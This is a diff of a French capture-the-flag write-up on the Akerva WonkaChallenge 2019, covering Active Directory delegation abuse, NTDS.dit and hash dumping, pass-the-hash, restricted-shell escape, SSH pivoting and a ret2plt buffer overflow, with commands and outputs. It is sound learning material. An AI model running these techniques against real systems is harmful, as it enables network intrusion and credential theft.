 > 87950cf8267662a3b26460b38a07f0e2f203539676f4a88a7c572a596140ade4
 
@@ -1117,11 +1080,9 @@ Et maintenant il suffit d'en faire le sha256 pour avoir la flag.
 3. __ired.team__, _Credential Access & Dumping_, ired.team : https://ired.team/offensive-security/credential-access-and-credential-dumping
 4. __Mark Russinovich and Andrew Richards__, _ProcDump v9.0_,  Documentation Microsoft : https://docs.microsoft.com/en-us/sysinternals/downloads/procdump
 
-## Step 7 - Spreading love
+## VII. Step 7 - Spreading love
 
 >  Sharing is caring ;) 
-
-![](https://media.giphy.com/media/l2R06ThAkEohO3DHi/giphy.gif)
 
 ### TL;DR
 
@@ -1131,7 +1092,7 @@ Et maintenant il suffit d'en faire le sha256 pour avoir la flag.
 
 ---
 
-### State of the art
+### VII.1. State of the art
 
 Maintenant il faut se rappeler les différents scans qu'on a fait jusqu'à présent. Le potentiel DC est le `172.16.42.5`, voyons s'il est possible de se connecter à un share :
 
@@ -1153,7 +1114,7 @@ SMB         172.16.42.5     445    DC01-WW2         Users           READ
 
 Il y a le share "Users" ! C'est super intéressant ! 
 
-### Mount Users share
+### VII.2. Mount Users share
 
 Il ne reste plus qu'à monter le volume distant.
 
@@ -1173,7 +1134,7 @@ Administrator
         └── flag-07.txt
 ```
 
-### Flag
+### VII.3. Flag
 
 > 5FFECA75938FA8E5D7FCB436451DA1BC4713DCD94DD6F57F2DF50E035039AB0C
 
@@ -1184,11 +1145,9 @@ Administrator
 1. __ShawnDEvans__, _SMBmap_, GitHub : https://github.com/ShawnDEvans/smbmap
 2. __Mickael Dorigny__, _Monter un partage CIFS sous Linux_, it-connect : https://www.it-connect.fr/monter-un-partage-cifs-sous-linux/
 
-## Step 8 - Wagging the dogs
+## VIII. Step 8 - Wagging the dogs
 
 >  SHA256(NTLM(krbtgt)) 
-
-![](https://media.giphy.com/media/3orif3kYWn0jg3JiWA/giphy.gif)
 
 ### TL;DR
 
@@ -1204,7 +1163,7 @@ Administrator
 
 ---
 
-### State of the art
+### VIII.1. State of the art
 
 Cette étape a été pour moi la plus compliquée du challenge, j'y ai passé vraiment plusieurs heures dessus. Pour réussir correctement cette étape il faut partir de la note récupéré dans l'épreuve précédente :
 
@@ -1228,7 +1187,7 @@ Il faut prendre en compte toutes les informations. La note ci-dessus parle de `d
 * Resources based constrained delegation : https://beta.hackndo.com/resource-based-constrained-delegation-attack/
 * Unconstrained delegation : https://beta.hackndo.com/unconstrained-delegation-attack/
 
-#### Connection to Active Directory
+#### VIII.1.a. Connection to Active Directory
 
 Maintenant qu'on a un compte pouvant se connecter au domaine, j'ai décidé d'ajouter ma Commando VM à l'active directory. Pour ça, j'ai mis ma VM en NAT et je me suis connecté au VPN avec mon hôte, comme ça même les redémarrages de la VM ne vont pas être dérangeant pour se connecter à l'AD.
 
@@ -1250,7 +1209,7 @@ En type de compte, j'ai mis `Administrateur`, ça fait de `SvcJoinComputerToDom`
 ![](/img/writeups/wonkachall2019/step8_domainuser.png)
 _Fig 23_ : Test if the machine is in the domain
 
-#### Bloodhound
+#### VIII.1.b. Bloodhound
 
 Bloodhound est un outil de mapping Active Directory, je vais le lancer histoire de voir un peu les différentes relations entre les entités (machines, utilisateurs...) et essayer de récupérer des éléments sur les délégations. Voici la liste des domain admin :
 
@@ -1261,13 +1220,13 @@ Le but va être d'impersonate l'utilisateur `Administrator`.
 
 Le Bloodhound est disponible ici : https://mega.nz/#!2rwTFK4I!YMUyIKpmGUvH4uqr2DSjyGCpqEBEFqz8zG09NMJLgxg
 
-#### Which type of delegation ?
+#### VIII.1.c. Which type of delegation ?
 
 Avec les éléments récupérés, on a un compte pouvant ajouter une machine à un domaine, donc on s'affranchi de la phase du man in the middle ipv6 expliqué dans l'article de Pixis. En sachant ça, on peut ajouter une machine au domaine, créer et ajouter un SPN au domaine. On peut donc dire que ça ressemble à la `Resource Based Constrained Delegation`.
 
 Alors si j'ai bien compris cette histoire de resources based constrained delegation, il faut que j'ajoute une machine au domaine, une machine où je suis administrateur local. Ensuite, créer un compte SPN et l'ajouter au domaine. Une fois qu'on a une machine et un compte SPN, grâce à l'utilisateur `SvcJoinComputerToDom`, il faut modifier la variable `msds-allowedtoactonbehalfofotheridentity` pour que la ressource finale soit "de confiance". Une fois que tous ça est en place, il faut faire une requête `S4U2Self` pour récupérer un TGS non transférable et utiliser `S4U2Proxy` pour quand même accéder à la ressource voulu en tant que n'importe quel utilisateur, soit l'accès au DC en tant qu'Administrator.
 
-### Resource Based Constrained Delegation
+### VIII.2. Resource Based Constrained Delegation
 
 Après un peu de recherche, on tombe carrément sur un ps1 exploitant le RBCD, script réalisé par harmj0y : https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff
 
@@ -1276,7 +1235,7 @@ Pour réussir correctement cette exploitation, nous avons besoin des deux script
 * PowerView : https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1
 * PowerMad : https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1
 
-#### Verify right on AD
+#### VIII.2.a. Verify right on AD
 
 ```bash
 Import-Module .\powermad.ps1
@@ -1298,7 +1257,7 @@ FACTORY\SvcJoinComputerToDom
 FACTORY\SvcJoinComputerToDom
 ```
 
-#### Adding machine to domain
+#### VIII.2.b. Adding machine to domain
 
 Pour que l'attaque fonctionne il faut un compte avec un SPN, si on en a pas on peut en ajouter un grâce au MachineAccountQuota (par défaut on peut ajouter 10 machines dans le domaine).
 
@@ -1309,7 +1268,7 @@ New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureSt
 [+] Machine account attackersystem added
 ```
 
-#### Setting msDS-AllowedToActOnBehalfOfOtherIdentity 
+#### VIII.2.c. Setting msDS-AllowedToActOnBehalfOfOtherIdentity 
 
 On va juste set le tableau pour un compte et changer le sid avec notre machine qui contient un SPN :
 
@@ -1329,7 +1288,7 @@ _Fig 26_ : AccessAllowed
 
 Maintenant que tout est en place, il faut faire la tambouille avec le S4U.
 
-#### S4U2Self / S4U2Proxy
+#### VIII.2.d. S4U2Self / S4U2Proxy
 
 Pour réussir à impersonate `Administrator`, je vais utiliser Rubeus, et là on a une super erreur :
 
@@ -1351,7 +1310,7 @@ Et grâce à ce ticket, on peut accéder au disque du DC :
 ![](/img/writeups/wonkachall2019/step8_dir_allowed_on_dc.png)
 _Fig 30_ : Disque C du DC
 
-### Get NTDS.dit
+### VIII.3. Get NTDS.dit
 
 Maintenant qu'on a impersonate l'utilisateur Administrator, il est possible de se connecter au Domain Controller via psexec. Maintenant dans la pratique, c'est un peu capricieux... Mais bon, il suffit d'une fois et de récupérer le ntds.dit !
 
@@ -1377,7 +1336,7 @@ reg.exe save hklm\system c:\windows\temp\system.save
 ![](/img/writeups/wonkachall2019/step8_dumpsystem.png)
 _Fig 32_ : Extracting system base
 
-### Get hashes
+### VIII.4. Get hashes
 
 Maintenant, il ne reste plus qu'à rappatrier tous ça à la maison et utiliser `secretsdump.py` :
 
@@ -1390,7 +1349,7 @@ _Fig 32_ : Extracting hash
 
 Enfin ! Il ne reste plus qu'à faire le sha256 du hash de krbtgt pour flag !
 
-### Flag
+### VIII.5. Flag
 
 > 24704ab2469b186e531e8864ae51c9497227f4a77f0bb383955c158101ab50c5
 
@@ -1405,11 +1364,9 @@ Enfin ! Il ne reste plus qu'à faire le sha256 du hash de krbtgt pour flag !
 4. __Dirk-jan Mollema__, _“Relaying” Kerberos - Having fun with unconstrained delegation_, Blog de Dirk-jan Mollema : https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/
 5. __swisskyrepo__, _PayloadsAllTheThings_, GitHub : https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#dumping-ad-domain-credentials-systemrootntdsntdsdit
 
-## Step 9 - Not so hashed
+## IX. Step 9 - Not so hashed
 
 >  Veruca's home 
-
-![](https://media.giphy.com/media/GIgGwpcmV0VjO/giphy.gif)
 
 ### TL;DR
 
@@ -1423,12 +1380,12 @@ Enfin ! Il ne reste plus qu'à faire le sha256 du hash de krbtgt pour flag !
 
 ---
 
-### State of the art
+### IX.1. State of the art
 
 Avec le hash de krbtgt en notre possession, on peut faire un golden ticket. Ca évitera de nous farcir toute la tambouille avec Rubeus à chaque fois. Cependant, maintenant qu'on a les hash de tout le monde, un pass the hash devrait aussi faire l'affaire.
 Il reste une machine qu'on a pas tapé encore : `172.16.42.101`
 
-### Pass the hash
+### IX.2. Pass the hash
 
 Bon, j'ai une technique pas très élégante, mais j'en avais marre de jouer à la roulette russe avec le psexec. J'ai donc bruteforce les pass the hash pour voir lequel arrive à se connecter. Ca n'a pas été bien long puisque j'ai commencé avec les utilisateurs ayant "admin" dans le nom :
 
@@ -1448,7 +1405,7 @@ cme smb 172.16.42.101 -u 'adminWorkstation' -H 'aad3b435b51404eeaad3b435b51404ee
 ![](/img/writeups/wonkachall2019/step9_pth.png)
 _Fig 32_ : Pass the hash works !
 
-### Veruca's password
+### IX.3. Veruca's password
 
 On commence avec un demi shell via wmiexec :
 
@@ -1476,7 +1433,7 @@ C:\Users\adminWorkstation>dir /a Desktop
 
 Avec un peu de recherche, on découvre qu'il est possible de récupérer des infos dans WinSCP lorsqu'il n'y a pas de master key. Pour récupérer les infos de veruca dans WinSCP, il existe deux méthodes, une méthode "à la main" et une méthode automatisée.
 
-#### Method 1 - Boring way
+#### IX.3.a. Method 1 - Boring way
 
 Avec le hash de `adminWorkstation`, on peut se connecter via wmiexec :
 
@@ -1499,7 +1456,7 @@ Il est alors possible de décoder le mot de passe de Veruca sur la Commando :
 CuiiiiYEE3r3!
 ```
 
-#### Method 2 - Automated way
+#### IX.3.b. Method 2 - Automated way
 
 Pour cette méthode, c'est [@lydericlefebvre](https://twitter.com/lydericlefebvre?lang=fr), organisateur du challenge, qui m'a donné l'astuce, une fois que j'avais flag évidemment ;)
 
@@ -1516,7 +1473,7 @@ On a donc les identifiants :
 
 > veruca@172.16.69.78 : CuiiiiYEE3r3!
 
-### SSH veruca's machine
+### IX.4. SSH veruca's machine
 
 Bien, on touche au but. Nous avons les identifiants de Veruca et son IP, qui est sur une autre route que celle montée par le VPN. Il suffit d'en déclarer une nouvelle :
 
@@ -1534,7 +1491,7 @@ C'est le moment de se connecter en SSH :
 ![](/img/writeups/wonkachall2019/step9_flag.png)
 _Fig 35_ : SSH connection and flag
 
-### Flag
+### IX.5. Flag
 
 > 83907d64b336c599b35132458f7697c4eb0de26635b9616ddafb8c53d5486ac2
 
@@ -1546,11 +1503,9 @@ _Fig 35_ : SSH connection and flag
 2. __anoopengineer__, _WinSCP Password Extractor/Decrypter/Revealer_, GitHub : https://github.com/anoopengineer/winscppasswd/
 3. __Vivek Gite__, _Linux route Add Command Examples_, cyberciti : https://www.cyberciti.biz/faq/linux-route-add/
 
-## Step 10 - The Great Escape
+## X. Step 10 - The Great Escape
 
 > Run Otman run, get out of this jail! 
-
-![](https://media.giphy.com/media/Y8wgPlCWM5jWg/giphy.gif)
 
 ### TL;DR
 
@@ -1565,7 +1520,7 @@ _Fig 35_ : SSH connection and flag
 
 ---
 
-### State of the art
+### X.1. State of the art
 
 Le premier reflexe est de vérifier le cache `arp` :
 
@@ -1580,14 +1535,14 @@ On a donc une nouvelle IP : `172.16.69.65`
 
 Après avoir essayé de réutiliser les identifiants de veruca sans succès, j'ai décidé de faire un scan de port sur les deux machines :
 
-#### 172.16.69.65 
+#### X.1.a. 172.16.69.65 
 
 ```bash
 ➜ sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 700 172.16.69.65           
 Discovered open port 22/tcp on 172.16.69.65                                                                     
 ```
 
-#### 172.16.69.78 (veruca)
+#### X.1.b. 172.16.69.78 (veruca)
 
 ```bash
 ➜ sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 700 172.16.69.78            
@@ -1657,7 +1612,7 @@ server {
 
 Il y a aussi un server Apache mais qui ne sert à rien.
 
-### dev3 website home
+### X.2. dev3 website home
 
 Avec le fichier de configuration, on sait que le home du site se situe ici : `/usr/share/nginx/dev3.challenge.akerva.com`
 
@@ -1681,14 +1636,14 @@ Ah bah voilà, une clé privé, sachant qu'il n'y a qu'un port 22 ouvert sur l'a
 
 La clé privé est disponible ici : https://mega.nz/#!Lj4DlAqD!QCLeAbjrbXU5QkCT8pGOXATWDV4jNjv4wuKc_nKoc9w
 
-### SSH connection
+### X.3. SSH connection
 
 Une simple connexion ssh avec une clé privée : 
 
 ![](/img/writeups/wonkachall2019/step10_lshell.png)
 _Fig 36_ : SSH connection and restricted shell
 
-### Escaping the restricted shell
+### X.4. Escaping the restricted shell
 
 Bon, nous sommes dans un shell restreint, enfin un `limited shell`, soit lshell : https://github.com/ghantoos/lshell
 
@@ -1714,7 +1669,7 @@ violet@SRV02-BACKUP:/usr/local/share/golden_tickets$ cat /home/violet/flag-10.tx
 d9c47d61bc453be0f870e0a840041ba054c6b7f725812ca017d7e1abd36b9865
 ```
 
-### Flag
+### X.5. Flag
 
 > d9c47d61bc453be0f870e0a840041ba054c6b7f725812ca017d7e1abd36b9865
 
@@ -1724,11 +1679,9 @@ d9c47d61bc453be0f870e0a840041ba054c6b7f725812ca017d7e1abd36b9865
 
 1. __ghantoos__, _lshell - SECURITY ISSUE: Inappropriate parsing of command syntax_, GitHub : https://github.com/ghantoos/lshell/issues/151#issuecomment-303696754
 
-## Step 11 - Basic enumeration
+## XI. Step 11 - Basic enumeration
 
 >  Free for all \o/ 
-
-![](https://media.giphy.com/media/3og0IBJHNHCZIwdnX2/giphy-downsized-large.gif)
 
 ### TL;DR
 
@@ -1738,7 +1691,7 @@ d9c47d61bc453be0f870e0a840041ba054c6b7f725812ca017d7e1abd36b9865
 
 ---
 
-### State of the art
+### XI.1. State of the art
 
 Alors cette partie a été très très vite. Il n'y a pas grand chose à dire, dans le `/home` il y a le dossier de `georgina`. Sa clé privé est en world readable:
 
@@ -1747,7 +1700,7 @@ _Fig 38_ : World readable private key
 
 La clé privé est disponible ici : https://mega.nz/#!7r5BEYBR!q02ij1f1vGJ8cgXDdrmfkKaHK16cFwngdTuDzqqJ6u8
 
-### SSH connection
+### XI.2. SSH connection
 
 ```bash
 ➜ chmod 0600 ~/Documents/id_rsa_georgina 
@@ -1765,17 +1718,15 @@ georgina@SRV02-BACKUP:~$ cat flag-11.txt
 5a4fec24bf04c854beee7e2d8678f84814a57243cbea3a7807cd0d5c973ab2d5
 ```
 
-### Flag
+### XI.3. Flag
 
 > 5a4fec24bf04c854beee7e2d8678f84814a57243cbea3a7807cd0d5c973ab2d5
 
 ---
 
-## Step 12 - Return to PLankTon
+## XII. Step 12 - Return to PLankTon
 
 > Pwn2Own
-
-![](https://media.giphy.com/media/POJt9CrJmvN5PageSf/giphy-downsized-large.gif)
 
 ### TL;DR
 
@@ -1788,7 +1739,7 @@ georgina@SRV02-BACKUP:~$ cat flag-11.txt
 
 ---
 
-### State of the art
+### XII.1. State of the art
 
 C'est le moment de faire un peu d'enumération pour essayer de root la machine. Pour celà, on a `LinEnum` :
 
@@ -1869,7 +1820,7 @@ Le binaire est en 64 bits, il nous faut un gadget `pop rdi; ret` pour placer not
 
 ![](/img/writeups/wonkachall2019/stack.jpg)
 
-### Find the padding
+### XII.2. Find the padding
 
 Pour trouver le padding d'un buffer overflow, je génère un pattern avec pwntool :
 
@@ -1889,7 +1840,7 @@ _Fig 39_ : Buffer overflow padding
 
 L'offset est donc de 296 octets.
 
-### System address
+### XII.3. System address
 
 Pour trouver l'adresse de `system`, un bon vieux objdump et un grep vont suffir :
 
@@ -1899,7 +1850,7 @@ Pour trouver l'adresse de `system`, un bon vieux objdump et un grep vont suffir 
   40133d:	e8 1e fd ff ff       	callq  401060 <system@plt>
 ```
 
-### Find gadget
+### XII.4. Find gadget
 
 Pour trouver le gadget, l'outil `ROPGadget` permet de trouver l'adresses des gadgets disponible dans un binaire. Pour rappel on cherche un `pop rdi; ret` :
 
@@ -1911,7 +1862,7 @@ Pour trouver le gadget, l'outil `ROPGadget` permet de trouver l'adresses des gad
 [...]
 ```
 
-### GNU binary
+### XII.5. GNU binary
 
 Notre binaire "GNU" va contenir un simple `bash -p`, l'argument permet de ne pas drop les droits pendant l'execution. 
 
@@ -1933,7 +1884,7 @@ Ce n'est pas vraiment `0x4002d0` l'adresse de GNU, on peut voir que ce n'est pas
 '0x4002d0'
 ```
 
-### Exploitation
+### XII.6. Exploitation
 
 Bon, on a tout ce qu'il nous faut : le padding, l'adresse du gadget, l'adresse de GNU et l'adresse de système. Il ne reste plus qu'à exploiter. Autre fait marrant, c'est que la librairie "pwntool" est installée sur le système en face, même pas besoin de convertir les adresses !
 
@@ -1946,7 +1897,7 @@ _Fig 41_ : Rooted !
 
 Le flag se trouve dans le dossier `/root`.
 
-### Flag
+### XII.7. Flag
 
 > 6f424a5e3b001ee6a832581680169e2f687d8d6e493bdb4b26d518798f7b3c30
 
@@ -1957,11 +1908,9 @@ Le flag se trouve dans le dossier `/root`.
 1. __Rémi Martin__, _Exploitation – ByPass ASLR+NX with ret2plt_, shoxx-website : http://shoxx-website.com/2016/05/exploitation-bypass-aslrnx-with-ret2plt.html
 2. __Geluchat__, _Petit Manuel du ROP à l'usage des débutants_, dailysecurity : https://www.dailysecurity.fr/return_oriented_programming/
 
-## Step 13 - The final countdown
+## XIII. Step 13 - The final countdown
 
 >  SHA256(WillyWonka's chief name) 
-
-![](https://media.giphy.com/media/izJTd56RgeU4U/giphy.gif)
 
 ### TL;DR
 
@@ -1974,7 +1923,7 @@ Le flag se trouve dans le dossier `/root`.
 
 ---
 
-### State of the art
+### XIII.1. State of the art
 
 Bon, maintenant qu'on a root la machine, c'est le dernier flag. Mais d'abord on va se mettre à l'aise et récupérer la clé privé dans le dossier root.
 Elle est disponible ici : https://mega.nz/#!q25BzSLZ!w9_4B8q7YTCgrUoMYkWPmyRn374xBZhxarUtYmgJJGc
@@ -1991,7 +1940,7 @@ IP address       HW type     Flags       HW address            Mask     Device
 
 Une nouvelle IP, la .23 ! Celle ci n'a pas l'air d'être accessible depuis mon hôte, on va faire un pivot. 
 
-### Setting up pivoting
+### XIII.2. Setting up pivoting
 
 Pour faire du pivot, il faut faire du port forwarding avec SSH :
 
@@ -2010,7 +1959,7 @@ quiet_mode
 socks4 	127.0.0.1 1080
 ```
 
-### Port scan
+### XIII.3. Port scan
 
 Le pivot en place, il n'y a plus qu'à scanner les ports de ce nouvel hote : 
 
@@ -2041,7 +1990,7 @@ PORT     STATE SERVICE REASON
 
 Quand j'ai vu le `2049` avec nfs, j'ai pas vraiment réfléchis.
 
-### Mouting nfs volume
+### XIII.4. Mouting nfs volume
 
 Je n'ai pas réussi à le monter à travers le proxychains. Du coup je l'ai monté sur la machine rootée :
 
@@ -2097,7 +2046,7 @@ Beaucoup de photos rigolotes ! Voilà le visage des fous qui ont imaginé ce sup
 
 ![](/img/writeups/wonkachall2019/flag_lol.jpg)
 
-### Get VIP files
+### XIII.5. Get VIP files
 
 Je vais récupérer tout le dossier VIP pour récupérer les métadonnées :
 
@@ -2114,7 +2063,7 @@ Author                          : Grandma Josephine
 
 Et le flag est le sha256 de "Grandma Josephine".
 
-### Flag
+### XIII.6. Flag
 
 > b8a3ef108d0c3fac75f3f99f4d6465db8b85b29f41edcfb419a986ca861239f9
 
@@ -2127,8 +2076,8 @@ Et le flag est le sha256 de "Grandma Josephine".
 
 ## Conclusion
 
-Le challenge créé et déployé par Akerva a été très long à résoudre, et probablement encore plus à réaliser. J'ai appris plusieurs petits tricks, comme se connecter à un bucket ou encore les différents type de délégations dans un Active Directory. Sur la partie Linux, c'était plutôt classique, mais quand même très sympa.
+Pour conclure, le WonkaChallenge d'Akerva m'a permis de travailler sur des technoloogies à jour. La difficulté globale du challenge a bien été dosée, malgrés les différents domaines parcourus. D'un point de vue plus personnel, j'ai appris plusieurs choses : intéragir avec des bucket s3, déployer une application via host-manager sur tomcat, le resource based constrained delegation pour impersonate un utilisateur sur l'active directory et enfin le ret2plt.
 
-Mise à part l'état un peu quantique pour le psexec, aucuns problèmes à signalés, le réseau et les épreuves étaient stables. En bref, un grand merci à l'équipe qui s'est occupé d'organiser ce challenge.
+Enfin, l'infrastrcture du challenge a très bien résisté. C'était agréable de faire le challenge sans bug ou autres problèmes. Il n'y a que l'utilisation un peu chaotique du psexec juste après le rbcd.
 
-A l'année prochaine !
+Pour terminer ce writeup, merci à l'équipe d'Akerva en charge du challenge ! C'était de belles épreuves et j'ai hâte de jouer le Wonka3 de l'année prochaine.
